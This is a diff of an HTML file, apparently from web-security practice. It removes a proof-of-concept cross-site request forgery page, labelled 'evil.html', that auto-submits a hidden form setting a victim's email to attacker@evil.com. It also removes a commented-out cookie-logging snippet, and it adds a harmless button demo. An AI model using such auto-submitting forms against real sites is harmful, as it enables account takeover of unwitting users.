@@ -1,15 +1,17 @@
-<!-- <iframe src="https://logicode.study">
-    <button onload="console.log(document.cookie);
-    "> click </button>
-</iframe> -->
-
-<!-- evil.html - Place on a different domain -->
 <!DOCTYPE html>
-<html>
-<body onload="document.getElementById('csrf-form').submit();">
-    <!-- <form id="csrf-form" action="http://localhost:3001" method="POST"> -->
-    <form id="csrf-form" action="http://dref12d.com/3d" method="POST">
-        <input type="hidden" name="newEmail" value="attacker@evil.com">
-    </form>
-</body>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <button onclick="run(event)">Click</button>        
+    <script>
+      function run(e) {
+        console.log(e);
+        e.target.style.backgroundColor = 'green';
+      }
+    </script>
+  </body>
 </html>
